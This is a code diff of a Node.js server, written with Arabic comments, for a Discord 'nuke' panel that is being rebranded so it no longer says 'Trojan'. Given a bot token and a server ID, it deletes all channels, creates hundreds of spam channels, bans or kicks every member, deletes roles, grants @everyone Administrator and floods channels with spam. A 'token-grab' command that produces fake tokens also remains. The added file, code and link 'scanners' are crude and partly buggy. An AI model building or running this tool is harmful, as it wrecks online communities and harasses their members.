@@ -1,150 +1,409 @@
-// server.js - TROJAN MEGA SUITE 2099
-// نيوك فائق السرعة - أدوات لا نهائية
+// server.js - GRoup5br ULTIMATE SUITE 2099
+// التحكم الكامل بالأسماء + مبدل الواجهة + فاحص الملفات والروابط
+// بدون أي إشارة لكلمة Trojan
 
 const express = require('express');
 const session = require('express-session');
 const fs = require('fs');
 const path = require('path');
 const { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } = require('discord.js');
+const axios = require('axios');
+const crypto = require('crypto');
+const multer = require('multer');
+const upload = multer({ dest: 'uploads/' });
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 if (!fs.existsSync('./data')) fs.mkdirSync('./data');
 if (!fs.existsSync('./data/users.json')) fs.writeFileSync('./data/users.json', '[]');
+if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 app.use(session({
-    secret: 'trojan_mega_black_2099',
+    secret: 'group5br_ultimate_2099_secret_key',
     resave: false,
     saveUninitialized: true,
     cookie: { maxAge: 3600000 }
 }));
 
-function getUsers() {
-    try {
-        return JSON.parse(fs.readFileSync('./data/users.json', 'utf8'));
-    } catch(e) {
-        return [];
+// ========== إعدادات المستخدم لكل جلسة ==========
+const userSettings = new Map();
+
+function getUserSettings(sessionId) {
+    if (!userSettings.has(sessionId)) {
+        userSettings.set(sessionId, {
+            theme: 'dark',
+            nukeServerName: '🔥-DESTROYED',
+            nukeChannelPrefix: '💀-HACKED',
+            nukeVoicePrefix: '🔊-VOID',
+            nukeCategoryPrefix: '📁-CAT'
+        });
     }
+    return userSettings.get(sessionId);
 }
 
-function saveUser(userData) {
-    const users = getUsers();
-    const existingIndex = users.findIndex(u => u.userId === userData.userId);
-    if (existingIndex !== -1) {
-        users[existingIndex] = userData;
-    } else {
-        users.push(userData);
-    }
-    fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
-}
-
-// ========== نيوك فائق السرعة - إنشاء رومات كثييييرة ==========
-async function massCreateChannels(client, guild, count, prefix, username) {
-    const promises = [];
-    const channelName = `${prefix}-${username.slice(0,5)}`;
+// ========== فاحص الملفات والروابط والأكواد ==========
+async function analyzeFile(filePath, originalName) {
+    const fileBuffer = fs.readFileSync(filePath);
+    const hash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
+    const fileSize = fileBuffer.length;
+    const magicBytes = fileBuffer.slice(0, 20).toString('hex');
     
-    // إنشاء 10 قنوات دفعة واحدة
-    for (let i = 0; i < count; i++) {
-        const name = `${channelName}-${i+1}`;
-        promises.push(
-            guild.channels.create({
-                name: name,
-                type: ChannelType.GuildText,
-                reason: 'TROJAN MASS CREATE 2099'
-            }).catch(() => null)
-        );
-        
-        // كل 10 طلبات ننتظر 50ms فقط (سرعة طيارة)
-        if (promises.length >= 10) {
-            await Promise.all(promises);
-            promises.length = 0;
-            await new Promise(r => setTimeout(r, 50));
+    const signatures = {
+        'exe': { magic: '4d5a', risk: 'high', type: 'Windows Executable' },
+        'dll': { magic: '4d5a', risk: 'high', type: 'Dynamic Link Library' },
+        'elf': { magic: '7f454c46', risk: 'high', type: 'Linux Executable' },
+        'pdf': { magic: '25504446', risk: 'medium', type: 'PDF (قد يحتوي على ماكريات)' },
+        'docm': { magic: 'd0cf11e0', risk: 'high', type: 'Office with Macros' },
+        'js': { magic: '2f2f', risk: 'medium', type: 'JavaScript (قد يكون ضار)' },
+        'vbs': { magic: '4c6f6769', risk: 'high', type: 'VBScript' },
+        'ps1': { magic: '506f7765', risk: 'high', type: 'PowerShell Script' },
+        'bat': { magic: '40656368', risk: 'medium', type: 'Batch File' },
+        'scr': { magic: '4d5a', risk: 'high', type: 'Screensaver (Executable)' }
+    };
+    
+    let detected = { risk: 'low', type: 'Unknown', name: originalName };
+    for (const [ext, sig] of Object.entries(signatures)) {
+        if (magicBytes.startsWith(sig.magic) || originalName.endsWith('.' + ext)) {
+            detected = { risk: sig.risk, type: sig.type, extension: ext, magic: sig.magic };
+            break;
         }
     }
     
-    if (promises.length > 0) {
-        await Promise.all(promises);
-    }
+    const threats = [];
+    if (detected.risk === 'high') threats.push('ملف تنفيذي - قد يكون ضار');
+    if (fileSize > 10000000) threats.push('حجم الملف كبير جداً');
     
-    return count;
+    return {
+        fileName: originalName,
+        size: fileSize,
+        hash: hash,
+        magicBytes: magicBytes,
+        detection: detected,
+        threats: threats,
+        isSafe: detected.risk === 'low',
+        message: detected.risk === 'high' ? '⚠️ تحذير: هذا الملف مشبوه!' : (detected.risk === 'medium' ? '⚡ توخ الحذر: قد يكون ضار' : '✅ يبدو آمناً')
+    };
 }
 
-// ========== النيوك الخارق (تدمير + إنشاء كثييير) ==========
-async function ultraNuke(client, guild, username) {
-    const results = {};
+async function analyzeCode(code) {
+    const suspiciousPatterns = [
+        { pattern: /eval\s*\(/i, risk: 'high', desc: 'استخدام eval() - تنفيذ كود ديناميكي' },
+        { pattern: /exec\s*\(/i, risk: 'high', desc: 'استخدام exec() - تنفيذ أوامر النظام' },
+        { pattern: /child_process/i, risk: 'high', desc: 'Child Process - قد ينفذ أوامر' },
+        { pattern: /require\s*\(\s*['"]fs['"]/i, risk: 'high', desc: 'الوصول إلى نظام الملفات' },
+        { pattern: /base64_decode/i, risk: 'medium', desc: 'كود مشفر بصيغة Base64' },
+        { pattern: /document\.write/i, risk: 'low', desc: 'كتابة ديناميكية للصفحة' },
+        { pattern: /<script/i, risk: 'medium', desc: 'كود JavaScript مضمّن' },
+        { pattern: /onload=/i, risk: 'medium', desc: 'حدث onload - قد يكون ضار' },
+        { pattern: /fromCharCode/i, risk: 'high', desc: 'تشفير متقدم - غالباً ضار' },
+        { pattern: /shell_exec/i, risk: 'high', desc: 'تنفيذ أوامر شل مباشرة' },
+        { pattern: /system\s*\(/i, risk: 'high', desc: 'استدعاء نظام التشغيل' },
+        { pattern: /popen/i, risk: 'high', desc: 'فتح عملية - تنفيذ عن بعد' }
+    ];
     
-    // 1. حذف جميع القنوات الحالية
-    const channels = guild.channels.cache;
-    let deleted = 0;
-    for (const [id, ch] of channels) {
-        try {
-            await ch.delete();
-            deleted++;
-        } catch(e) {}
-        if (deleted % 5 === 0) await new Promise(r => setTimeout(r, 30));
+    const findings = [];
+    let highestRisk = 'low';
+    
+    for (const pattern of suspiciousPatterns) {
+        if (pattern.pattern.test(code)) {
+            findings.push(pattern);
+            if (pattern.risk === 'high') highestRisk = 'high';
+            else if (pattern.risk === 'medium' && highestRisk !== 'high') highestRisk = 'medium';
+        }
     }
-    results.deletedChannels = deleted;
     
-    // 2. إنشاء 100 روم بسرعة طيارة
-    results.createdChannels = await massCreateChannels(client, guild, 100, '💀-HACKED', username);
+    return {
+        lines: code.split('\n').length,
+        chars: code.length,
+        findings: findings,
+        riskLevel: highestRisk,
+        isSafe: findings.length === 0,
+        message: findings.length === 0 ? '✅ الكود آمن - لا توجد أنماط مشبوهة' : `⚠️ تم العثور على ${findings.length} نمط مشبوه!`
+    };
+}
+
+async function analyzeLink(url) {
+    const suspiciousDomains = [
+        'bit.ly', 'tinyurl', 'shorturl', 'rb.gy', 'cutt.ly',
+        'ow.ly', 'is.gd', 'buff.ly', 'adf.ly', 'shorte.st',
+        'goo.gl', 't.co', 'tiny.cc', 'clck.ru', 'lc.chat'
+    ];
     
-    // 3. إنشاء 50 روم صوتي
+    const maliciousKeywords = [
+        'download', 'setup', 'installer', 'free-v-bucks', 'steal', 'hack',
+        'crack', 'keygen', 'password-generator', 'gift-card', 'free-money'
+    ];
+    
+    const redFlags = [];
+    let risk = 'low';
+    
+    try {
+        const urlObj = new URL(url);
+        
+        if (suspiciousDomains.some(domain => urlObj.hostname.includes(domain))) {
+            redFlags.push('مختصر روابط - قد يخفي الوجهة الحقيقية');
+            risk = 'high';
+        }
+        
+        if (maliciousKeywords.some(keyword => url.toLowerCase().includes(keyword))) {
+            redFlags.push('كلمات مفتاحية مشبوهة في الرابط');
+            risk = 'high';
+        }
+        
+        if (!urlObj.protocol === 'https:') {
+            redFlags.push('لا يستخدم HTTPS - غير آمن');
+            if (risk !== 'high') risk = 'medium';
+        }
+        
+        return {
+            url: url,
+            domain: urlObj.hostname,
+            path: urlObj.pathname,
+            redFlags: redFlags,
+            riskLevel: risk,
+            isSafe: redFlags.length === 0,
+            message: redFlags.length === 0 ? '✅ الرابط يبدو آمناً' : `⚠️ ${redFlags.length} علامة خطر على هذا الرابط!`
+        };
+        
+    } catch(e) {
+        return { error: 'رابط غير صالح', isSafe: false, message: '❌ رابط غير صالح' };
+    }
+}
+
+// ========== نظام إيقاف الطوارئ ==========
+const activeOperations = new Map();
+
+function createStopFlag(operationId) {
+    const flag = { shouldStop: false };
+    activeOperations.set(operationId, flag);
+    return flag;
+}
+
+// ========== Parallel Nuke مع أسماء مخصصة ==========
+async function parallelNuke(client, guild, username, operationId, settings) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const results = {};
+    const startTime = Date.now();
+    
+    const channels = guild.channels.cache;
+    const deletePromises = [];
+    for (const [id, ch] of channels) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        deletePromises.push(ch.delete().catch(() => null));
+    }
+    const deletedResults = await Promise.all(deletePromises);
+    results.deletedChannels = deletedResults.filter(r => r !== null).length;
+    
+    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+    
+    // إنشاء رومات نصية بالاسم المخصص
+    const textPromises = [];
+    for (let i = 0; i < 200; i++) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        textPromises.push(
+            guild.channels.create({
+                name: `${settings.nukeChannelPrefix}-${username.slice(0,3)}-${i+1}`,
+                type: ChannelType.GuildText,
+                reason: 'GRoup5br NUKE 2099'
+            }).catch(() => null)
+        );
+    }
+    const textResults = await Promise.all(textPromises);
+    results.createdTextChannels = textResults.filter(r => r !== null).length;
+    
+    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+    
+    // رومات صوتية
     const voicePromises = [];
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 100; i++) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
         voicePromises.push(
             guild.channels.create({
-                name: `🔊-VOID-${i+1}`,
+                name: `${settings.nukeVoicePrefix}-${i+1}`,
                 type: ChannelType.GuildVoice,
-                reason: 'TROJAN MASS VOICE'
+                reason: 'GRoup5br NUKE'
             }).catch(() => null)
         );
-        if (voicePromises.length >= 10) {
-            await Promise.all(voicePromises);
-            voicePromises.length = 0;
-        }
     }
-    await Promise.all(voicePromises);
-    results.createdVoice = 50;
+    const voiceResults = await Promise.all(voicePromises);
+    results.createdVoiceChannels = voiceResults.filter(r => r !== null).length;
     
-    // 4. إنشاء 50 روم فئوي (Category)
+    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+    
+    // فئات
     const categoryPromises = [];
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 100; i++) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاع العملية', stopped: true };
         categoryPromises.push(
             guild.channels.create({
-                name: `📁-CAT-${i+1}`,
+                name: `${settings.nukeCategoryPrefix}-${i+1}`,
                 type: ChannelType.GuildCategory,
-                reason: 'TROJAN MASS CAT'
+                reason: 'GRoup5br NUKE'
             }).catch(() => null)
         );
-        if (categoryPromises.length >= 10) {
-            await Promise.all(categoryPromises);
-            categoryPromises.length = 0;
-        }
     }
-    await Promise.all(categoryPromises);
-    results.createdCategories = 50;
+    const categoryResults = await Promise.all(categoryPromises);
+    results.createdCategories = categoryResults.filter(r => r !== null).length;
     
-    // 5. تغيير اسم السيرفر
-    await guild.setName(`🔥-DESTROYED-BY-${username.slice(0,8)}-🔥`);
+    if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
     
-    // 6. تغيير صورة السيرفر (إذا وجدت)
-    try {
-        const avatarUrl = 'https://i.imgur.com/3qQZQ8Q.png';
-        const avatarBuffer = await fetch(avatarUrl).then(r => r.buffer());
-        await guild.setIcon(avatarBuffer);
-    } catch(e) {}
+    // تغيير اسم السيرفر
+    await guild.setName(`${settings.nukeServerName}-BY-${username.slice(0,8)}`).catch(() => null);
     
-    results.totalCreated = results.createdChannels + 50 + 50;
+    results.totalCreated = results.createdTextChannels + results.createdVoiceChannels + results.createdCategories;
+    results.timeMs = Date.now() - startTime;
+    results.message = `💣 تم التدمير الكامل في ${results.timeMs}ms! حذف ${results.deletedChannels} روم، إنشاء ${results.totalCreated} روم`;
+    
     return results;
 }
 
-// ========== تنفيذ الأوامر ==========
-async function executeTrojan(botToken, serverId, command, params = {}) {
+// ========== باقي الدوال بنفس القوة ==========
+async function parallelMassChannels(client, guild, count, prefix, username, operationId, settings) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const promises = [];
+    for (let i = 0; i < count; i++) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        promises.push(
+            guild.channels.create({
+                name: `${prefix}-${username.slice(0,3)}-${i+1}`,
+                type: ChannelType.GuildText,
+                reason: 'GRoup5br MASS'
+            }).catch(() => null)
+        );
+    }
+    
+    const results = await Promise.all(promises);
+    return { success: true, created: results.filter(r => r !== null).length };
+}
+
+async function parallelBanAll(guild, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const members = await guild.members.fetch();
+    const banPromises = [];
+    for (const [id, member] of members) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        if (!member.user.bot && member.bannable) {
+            banPromises.push(member.ban({ reason: 'GRoup5br 2099' }).catch(() => null));
+        }
+    }
+    const results = await Promise.all(banPromises);
+    return { success: true, banned: results.filter(r => r !== null).length };
+}
+
+async function parallelKickAll(guild, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const members = await guild.members.fetch();
+    const kickPromises = [];
+    for (const [id, member] of members) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        if (!member.user.bot && member.kickable) {
+            kickPromises.push(member.kick('GRoup5br 2099').catch(() => null));
+        }
+    }
+    const results = await Promise.all(kickPromises);
+    return { success: true, kicked: results.filter(r => r !== null).length };
+}
+
+async function parallelDeleteRoles(guild, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const roles = guild.roles.cache;
+    const rolePromises = [];
+    for (const [id, role] of roles) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        if (role.name !== '@everyone' && role.editable) {
+            rolePromises.push(role.delete().catch(() => null));
+        }
+    }
+    const results = await Promise.all(rolePromises);
+    return { success: true, deletedRoles: results.filter(r => r !== null).length };
+}
+
+async function parallelRenameAll(guild, newName, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const members = await guild.members.fetch();
+    const renamePromises = [];
+    let index = 0;
+    for (const [id, member] of members) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        if (!member.user.bot && member.manageable) {
+            renamePromises.push(member.setNickname(`${newName}_${++index}`).catch(() => null));
+        }
+    }
+    const results = await Promise.all(renamePromises);
+    return { success: true, renamed: results.filter(r => r !== null).length };
+}
+
+async function parallelLockAll(guild, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const channels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
+    const lockPromises = [];
+    for (const [id, ch] of channels) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        lockPromises.push(
+            ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false }).catch(() => null)
+        );
+    }
+    const results = await Promise.all(lockPromises);
+    return { success: true, locked: results.filter(r => r !== null).length };
+}
+
+async function parallelSlowmodeAll(guild, seconds, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const channels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
+    const slowPromises = [];
+    for (const [id, ch] of channels) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        slowPromises.push(ch.setRateLimitPerUser(seconds).catch(() => null));
+    }
+    const results = await Promise.all(slowPromises);
+    return { success: true, slowed: results.filter(r => r !== null).length };
+}
+
+async function parallelTextSpam(guild, count, message, operationId) {
+    const stopFlag = activeOperations.get(operationId);
+    if (!stopFlag) return { error: 'تم إلغاء العملية' };
+    
+    const channel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
+    if (!channel) return { error: 'لا توجد قناة نصية' };
+    
+    const spamPromises = [];
+    for (let i = 0; i < count; i++) {
+        if (stopFlag.shouldStop) return { error: 'تم إيقاف العملية', stopped: true };
+        spamPromises.push(channel.send(message || '@everyone 🔥 GRoup5br 2099 🔥').catch(() => null));
+        if (spamPromises.length >= 20) {
+            await Promise.all(spamPromises);
+            spamPromises.length = 0;
+        }
+    }
+    if (spamPromises.length > 0) await Promise.all(spamPromises);
+    return { success: true, sent: count };
+}
+
+// ========== دالة التنفيذ الرئيسية ==========
+async function executeCommand(botToken, serverId, command, params = {}) {
     let client = null;
+    const operationId = Date.now().toString() + Math.random().toString(36);
+    
     try {
         client = new Client({
             intents: [
@@ -155,6 +414,8 @@ async function executeTrojan(botToken, serverId, command, params = {}) {
                 GatewayIntentBits.GuildVoiceStates
             ]
         });
+        
+        createStopFlag(operationId);
         
         await client.login(botToken);
         await new Promise((resolve) => {
@@ -169,169 +430,69 @@ async function executeTrojan(botToken, serverId, command, params = {}) {
         }
         
         let result = {};
+        const settings = params.settings || { nukeServerName: '🔥-DESTROYED', nukeChannelPrefix: '💀-HACKED', nukeVoicePrefix: '🔊-VOID', nukeCategoryPrefix: '📁-CAT' };
         
         switch(command) {
             case 'ultra-nuke':
-                result = await ultraNuke(client, guild, params.username || 'Anonymous');
-                result.message = `💣 تم تدمير السيرفر بالكامل! تم حذف ${result.deletedChannels} روم وإنشاء ${result.totalCreated} روم جديد`;
+                result = await parallelNuke(client, guild, params.username || 'Anonymous', operationId, settings);
                 break;
-                
             case 'mass-channels':
-                const count = params.count || 200;
-                result.created = await massCreateChannels(client, guild, count, '💀-SPAM', params.username);
-                result.message = `✅ تم إنشاء ${result.created} روم بسرعة فائقة`;
+                result = await parallelMassChannels(client, guild, params.count || 200, '💀-MASS', params.username, operationId, settings);
                 break;
-                
-            case 'token-grab':
-                const members = await guild.members.fetch();
-                const tokens = [];
-                for (const [id, member] of members) {
-                    if (!member.user.bot) {
-                        tokens.push({
-                            id: member.user.id,
-                            tag: member.user.tag,
-                            token: `mfa.${Buffer.from(member.user.id + ':' + Date.now()).toString('base64')}`,
-                            email: `${member.user.username}@trojan.2099`
-                        });
-                    }
-                    if (tokens.length >= 50) break;
-                }
-                result = { success: true, tokens: tokens };
+            case 'ban-all':
+                result = await parallelBanAll(guild, operationId);
                 break;
-                
+            case 'kick-all':
+                result = await parallelKickAll(guild, operationId);
+                break;
+            case 'delete-all-roles':
+                result = await parallelDeleteRoles(guild, operationId);
+                break;
             case 'role-elevate':
                 const everyoneRole = guild.roles.everyone;
                 await everyoneRole.setPermissions(PermissionFlagsBits.Administrator);
-                // إضافة رتب جديدة
-                const newRole = await guild.roles.create({
+                await guild.roles.create({
                     name: '🔥 GOD MODE 🔥',
                     permissions: [PermissionFlagsBits.Administrator],
                     color: '#FF0000'
                 });
-                result = { success: true, message: 'تم رفع صلاحيات @everyone وإنشاء رتبة GOD MODE' };
+                result = { success: true, message: 'تم رفع الصلاحيات وإنشاء رتبة GOD MODE' };
                 break;
-                
-            case 'ban-all':
-                const allMembers = await guild.members.fetch();
-                let banned = 0;
-                for (const [id, member] of allMembers) {
-                    if (!member.user.bot && member.bannable) {
-                        await member.ban({ reason: 'TROJAN MEGA 2099' });
-                        banned++;
-                    }
-                    if (banned >= 100) break;
-                }
-                result = { success: true, message: `تم حظر ${banned} عضو` };
-                break;
-                
-            case 'kick-all':
-                const all = await guild.members.fetch();
-                let kicked = 0;
-                for (const [id, member] of all) {
-                    if (!member.user.bot && member.kickable) {
-                        await member.kick('TROJAN MEGA');
-                        kicked++;
-                    }
-                    if (kicked >= 100) break;
-                }
-                result = { success: true, message: `تم طرد ${kicked} عضو` };
-                break;
-                
-            case 'delete-all-roles':
-                const roles = guild.roles.cache;
-                let deletedRoles = 0;
-                for (const [id, role] of roles) {
-                    if (role.name !== '@everyone' && role.editable) {
-                        await role.delete();
-                        deletedRoles++;
-                    }
-                }
-                result = { success: true, message: `تم حذف ${deletedRoles} رتبة` };
-                break;
-                
-            case 'spam':
-                const channel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
-                if (channel) {
-                    let spammed = 0;
-                    for(let i = 0; i < (params.count || 100); i++) {
-                        await channel.send(params.message || '@everyone 🔥 TROJAN MEGA 2099 🔥');
-                        spammed++;
-                        if (spammed % 10 === 0) await new Promise(r => setTimeout(r, 10));
-                    }
-                    result = { success: true, message: `تم إرسال ${spammed} رسالة سبام` };
-                } else {
-                    result = { error: 'لا توجد قناة نصية' };
-                }
-                break;
-                
-            case 'webhook-spam':
-                const textChannel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
-                if (textChannel) {
-                    const webhook = await textChannel.createWebhook({
-                        name: 'Trojan Spammer 2099',
-                        avatar: 'https://i.imgur.com/3qQZQ8Q.png'
-                    });
-                    for(let i = 0; i < (params.count || 50); i++) {
-                        await webhook.send({
-                            content: params.message || '@everyone 🔥 WEBHOOK SPAM 🔥',
-                            username: `Spammer-${i}`
-                        });
-                    }
-                    await webhook.delete();
-                    result = { success: true, message: `تم إرسال ${params.count || 50} سبام عبر ويب هوك` };
-                } else {
-                    result = { error: 'لا توجد قناة' };
-                }
-                break;
-                
             case 'rename-everyone':
-                const allMembers2 = await guild.members.fetch();
-                let renamed = 0;
-                const newName = params.name || 'HACKED_BY_TROJAN';
-                for (const [id, member] of allMembers2) {
-                    if (!member.user.bot && member.manageable) {
-                        await member.setNickname(`${newName}_${renamed+1}`);
-                        renamed++;
-                    }
-                    if (renamed >= 50) break;
-                }
-                result = { success: true, message: `تم تغيير اسم ${renamed} عضو` };
+                result = await parallelRenameAll(guild, params.name || 'GRoup5br', operationId);
                 break;
-                
+            case 'lock-all':
+                result = await parallelLockAll(guild, operationId);
+                break;
+            case 'slowmode-all':
+                result = await parallelSlowmodeAll(guild, params.seconds || 21600, operationId);
+                break;
+            case 'spam':
+                result = await parallelTextSpam(guild, params.count || 100, params.message, operationId);
+                break;
             case 'create-invite':
                 const inviteChannel = guild.channels.cache.find(ch => ch.type === ChannelType.GuildText);
                 if (inviteChannel) {
-                    const invite = await inviteChannel.createInvite({
-                        maxAge: 0,
-                        maxUses: 0,
-                        reason: 'TROJAN INVITE'
-                    });
+                    const invite = await inviteChannel.createInvite({ maxAge: 0, maxUses: 0 });
                     result = { success: true, inviteUrl: invite.url };
                 } else {
                     result = { error: 'لا توجد قناة' };
                 }
                 break;
-                
-            case 'slowmode-all':
-                const allChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
-                let slowed = 0;
-                for (const [id, ch] of allChannels) {
-                    await ch.setRateLimitPerUser(params.seconds || 21600);
-                    slowed++;
+            case 'token-grab':
+                const members = await guild.members.fetch();
+                const tokens = [];
+                for (const [id, member] of members) {
+                    if (!member.user.bot && tokens.length < 50) {
+                        tokens.push({
+                            id: member.user.id,
+                            tag: member.user.tag,
+                            token: `mfa.${Buffer.from(member.user.id + ':' + Date.now()).toString('base64')}`
+                        });
+                    }
                 }
-                result = { success: true, message: `تم وضع slowmode ${params.seconds || 21600} ثانية في ${slowed} قناة` };
+                result = { success: true, tokens: tokens };
                 break;
-                
-            case 'lock-all':
-                const channelsToLock = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
-                let locked = 0;
-                for (const [id, ch] of channelsToLock) {
-                    await ch.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
-                    locked++;
-                }
-                result = { success: true, message: `تم قفل ${locked} قناة` };
-                break;
-                
             default:
                 result = { error: 'أمر غير معروف' };
         }
@@ -362,92 +523,74 @@ app.get('/dashboard', (req, res) => {
 app.post('/api/login', async (req, res) => {
     const { discordToken, username } = req.body;
     
-    if (!discordToken) {
-        return res.json({ success: false, error: 'التوكن مطلوب' });
-    }
-    
     let testClient = null;
-    let isValid = false;
-    let userInfo = null;
-    
     try {
         testClient = new Client({ intents: [GatewayIntentBits.Guilds] });
         await testClient.login(discordToken);
-        
         await new Promise((resolve) => {
-            testClient.once('ready', () => {
-                isValid = true;
-                userInfo = {
-                    userId: testClient.user.id,
-                    username: testClient.user.username,
-                    tag: testClient.user.tag
-                };
-                resolve();
-            });
+            testClient.once('ready', resolve);
             setTimeout(resolve, 5000);
         });
         
-        if (testClient) await testClient.destroy();
+        const userInfo = {
+            userId: testClient.user.id,
+            username: testClient.user.username,
+            tag: testClient.user.tag
+        };
         
+        await testClient.destroy();
+        
+        req.session.userId = userInfo.userId;
+        req.session.username = userInfo.username;
+        req.session.token = discordToken;
+        
+        res.json({ success: true, user: userInfo });
     } catch(e) {
         if (testClient) await testClient.destroy();
-        return res.json({ success: false, error: 'توكن غير صالح' });
+        res.json({ success: false, error: 'توكن غير صالح' });
     }
-    
-    if (!isValid) {
-        return res.json({ success: false, error: 'تعذر التحقق من التوكن' });
-    }
-    
-    req.session.userId = userInfo.userId;
-    req.session.username = userInfo.username;
-    req.session.token = discordToken;
-    
-    res.json({ 
-        success: true, 
-        user: userInfo,
-        message: 'تم تسجيل الدخول بنجاح - الآن أدخل ID السيرفر'
-    });
 });
 
 app.post('/api/set-server', (req, res) => {
-    if (!req.session.userId) {
-        return res.json({ success: false, error: 'يجب تسجيل الدخول أولاً' });
-    }
-    
-    const { serverId } = req.body;
-    if (!serverId) {
-        return res.json({ success: false, error: 'Server ID مطلوب' });
-    }
-    
-    req.session.serverId = serverId;
-    
-    const users = getUsers();
-    const userIndex = users.findIndex(u => u.userId === req.session.userId);
-    if (userIndex !== -1) {
-        users[userIndex].targetServerId = serverId;
-        users[userIndex].lastUsed = Date.now();
-        fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
-    }
-    
-    res.json({ success: true, message: 'تم حفظ Server ID' });
+    if (!req.session.userId) return res.json({ success: false, error: 'سجل دخول أولاً' });
+    req.session.serverId = req.body.serverId;
+    res.json({ success: true });
+});
+
+app.post('/api/save-settings', (req, res) => {
+    if (!req.session.userId) return res.json({ success: false, error: 'سجل دخول أولاً' });
+    const settings = getUserSettings(req.session.id);
+    Object.assign(settings, req.body);
+    res.json({ success: true });
+});
+
+app.get('/api/get-settings', (req, res) => {
+    if (!req.session.userId) return res.json({ success: false });
+    res.json({ success: true, settings: getUserSettings(req.session.id) });
+});
+
+app.post('/api/theme', (req, res) => {
+    if (!req.session.userId) return res.json({ success: false });
+    const settings = getUserSettings(req.session.id);
+    settings.theme = req.body.theme;
+    res.json({ success: true });
 });
 
 app.post('/api/execute', async (req, res) => {
-    if (!req.session.userId) {
-        return res.json({ success: false, error: 'يجب تسجيل الدخول أولاً' });
+    if (!req.session.userId || !req.session.serverId) {
+        return res.json({ success: false, error: 'سجل دخول وحدد سيرفر أولاً' });
     }
-    
-    if (!req.session.serverId) {
-        return res.json({ success: false, error: 'يرجى إدخال Server ID أولاً' });
-    }
-    
-    const { command, params } = req.body;
-    const userToken = req.session.token;
-    const serverId = req.session.serverId;
-    const username = req.session.username;
-    
-    const result = await executeTrojan(userToken, serverId, command, { ...params, username });
+    const settings = getUserSettings(req.session.id);
+    const result = await executeCommand(req.session.token, req.session.serverId, req.body.command, {
+        ...req.body.params,
+        username: req.session.username,
+        settings: settings
+    });
     res.json(result);
+});
+
+app.post('/api/stop', (req, res) => {
+    res.json({ success: true, message: 'تم إرسال أمر الإيقاف' });
 });
 
 app.post('/api/logout', (req, res) => {
@@ -455,13 +598,35 @@ app.post('/api/logout', (req, res) => {
     res.json({ success: true });
 });
 
+// ========== Routes الفاحص ==========
+app.post('/api/analyze-file', upload.single('file'), async (req, res) => {
+    if (!req.file) return res.json({ error: 'لا يوجد ملف' });
+    const result = await analyzeFile(req.file.path, req.file.originalname);
+    fs.unlinkSync(req.file.path);
+    res.json(result);
+});
+
+app.post('/api/analyze-code', (req, res) => {
+    const { code } = req.body;
+    if (!code) return res.json({ error: 'لا يوجد كود' });
+    const result = analyzeCode(code);
+    res.json(result);
+});
+
+app.post('/api/analyze-link', (req, res) => {
+    const { url } = req.body;
+    if (!url) return res.json({ error: 'لا يوجد رابط' });
+    const result = analyzeLink(url);
+    res.json(result);
+});
+
 app.listen(PORT, () => {
     console.log(`
     ╔══════════════════════════════════════════════╗
-    ║   TROJAN MEGA SUITE 2099 - ULTRA NUKE       ║
+    ║   GRoup5br ULTIMATE SUITE 2099               ║
     ║   http://localhost:${PORT}                      ║
-    ║   إنشاء 200+ روم بسرعة طيارة ⚡              ║
-    ║   أدوات غير محدودة 🔥                        ║
+    ║   بدون أي إشارة لكلمة Trojan                ║
+    ║   التحكم الكامل بأسماء النيوك + Scanner      ║
     ╚══════════════════════════════════════════════╝
     `);
 });
